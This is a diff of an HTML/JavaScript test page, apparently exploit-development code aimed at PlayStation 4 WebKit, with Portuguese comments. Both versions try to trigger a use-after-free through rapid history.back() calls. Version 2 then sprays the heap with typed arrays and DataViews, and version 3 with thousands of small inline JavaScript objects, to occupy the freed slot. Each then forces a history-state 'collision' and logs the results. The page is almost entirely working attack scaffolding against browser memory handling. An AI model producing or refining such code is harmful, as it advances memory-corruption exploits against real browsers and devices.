@@ -1,113 +1,95 @@
-
 <!DOCTYPE html>
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 WebKit – Slot Fixation V2</title>
+<title>Slot Fixation V3 – Plain JSObject Inline</title>
+<style>
+body { font-family: monospace; background:#000; color:#0f0; }
+button { font-size:16px; margin:4px; }
+pre { white-space:pre-wrap; }
+</style>
 </head>
 <body>
 
-<h1>Slot Fixation V2 – TypedArray Header Capture</h1>
+<h2>Slot Fixation V3 — JSObject Inline</h2>
+
 <button onclick="run()">RUN TEST</button>
 <pre id="log"></pre>
 
 <script>
-function log(s) {
-    document.getElementById("log").textContent += s + "\n";
+function log(x) {
+  document.getElementById("log").textContent += x + "\n";
 }
 
-/* ================================
-   UAF TRIGGER (INALTERADO)
-================================ */
-async function triggerUAF() {
-    log("=== UAF TRIGGER START ===");
-    for (let i = 0; i < 48; i += 6) {
-        history.back();
-        log("[ITER " + i + "] back() async");
-        await new Promise(r => setTimeout(r, 1));
-    }
-    log(">>> UAF WINDOW <<<");
-}
+/* ---------------- UAF TRIGGER (mantém seu padrão) ---------------- */
 
-/* ================================
-   SLOT FIXATION V2
-   (CORREÇÃO REAL)
-================================ */
-function allocateSlotFixers() {
-    log("\n=== SLOT FIXATION PHASE (V2) ===");
-
-    let keep = [];
-
-    /* 1️⃣ Zero-length TypedArray headers */
-    for (let i = 0; i < 2000; i++) {
-        keep.push(new Uint8Array(0));
-    }
-
-    /* 2️⃣ Minimal ArrayBuffer-backed views */
-    for (let i = 0; i < 2000; i++) {
-        keep.push(new DataView(new ArrayBuffer(16)));
-    }
-
-    /* 3️⃣ Small typed arrays matching JSCell allocator */
-    for (let i = 0; i < 2000; i++) {
-        keep.push(new Uint16Array(1));
-    }
-
-    log("Allocated TypedArray/DataView headers: " + keep.length);
-    return keep;
-}
-
-/* ================================
-   CONTROLLED HISTORY COLLISION
-================================ */
-function controlCollision() {
-    log("\n=== CONTROL COLLISION ===");
-
-    let small = "#A";
-    let large = "#" + "B".repeat(330000);
-
-    history.replaceState({ctrl: "A"}, "", small);
-    history.replaceState({ctrl: "B"}, "", large);
-
+function triggerUAF(cb) {
+  log("=== UAF TRIGGER START ===");
+  for (let i = 0; i < 48; i += 6) {
     history.back();
+    log("[ITER " + i + "] back() async");
+  }
+  setTimeout(() => {
+    log(">>> UAF WINDOW <<<");
+    cb();
+  }, 40);
 }
 
-/* ================================
-   MAIN TEST
-================================ */
-async function run() {
-    document.getElementById("log").textContent = "";
+/* ---------------- SLOT FIXATION V3 ---------------- */
 
-    /* Baseline */
-    log("=== BASELINE ===");
+function sprayInlineObjects(count) {
+  let arr = [];
+  for (let i = 0; i < count; i++) {
+    // JSObject pequeno, inline, sem transição de shape
+    arr.push({ a: i & 0xff, b: 0x41 });
+  }
+  return arr;
+}
+
+function snapshot(tag) {
+  try {
+    log("[" + tag + "] history.state = " + JSON.stringify(history.state));
+    log("[" + tag + "] keys = " + Object.keys(history.state));
+  } catch (e) {
+    log("[" + tag + "] state read error");
+  }
+}
+
+/* ---------------- MAIN TEST ---------------- */
+
+function run() {
+  document.getElementById("log").textContent = "";
+
+  log("=== BASELINE ===");
+  log("URL.length = " + location.href.length);
+  history.replaceState({ i: 1 }, "", location.href);
+  snapshot("BASE");
+
+  triggerUAF(() => {
+
+    log("\n=== SLOT FIXATION PHASE (V3) ===");
+    let spray = sprayInlineObjects(8000);
+    log("Sprayed JSObjects: " + spray.length);
+
+    log("\n=== CONTROL COLLISION ===");
+    history.replaceState({ ctrl: "A" }, "", "#A");
+    history.replaceState({ ctrl: "B" }, "", "#B");
+    history.back();
+
+    log("\n=== POST ===");
     log("URL.length = " + location.href.length);
-    log("history.state = " + JSON.stringify(history.state));
-    log("history.length = " + history.length);
+    log("hash.length = " + location.hash.length);
+    snapshot("POST");
 
-    await triggerUAF();
+    log("\n=== CONSISTENCY CHECK ===");
+    try {
+      log("Final ctrl = " + history.state.ctrl);
+    } catch {
+      log("Final ctrl = <exception>");
+    }
 
-    /* Fix slot */
-    let slotKeepAlive = allocateSlotFixers();
-
-    /* Collision */
-    controlCollision();
-
-    /* Observe */
-    setTimeout(() => {
-        log("\n=== POST ===");
-        log("URL.length = " + location.href.length);
-        log("hash.length = " + location.hash.length);
-        log("history.state = " + JSON.stringify(history.state));
-        log("history.length = " + history.length);
-
-        let ctrl = history.state ? history.state.ctrl : undefined;
-        log("\n=== CONSISTENCY CHECK ===");
-        log("Final ctrl = " + ctrl);
-        log("=== TEST END ===");
-
-        /* Prevent GC */
-        window.__keep = slotKeepAlive;
-    }, 50);
+    log("=== TEST END ===");
+  });
 }
 </script>
 
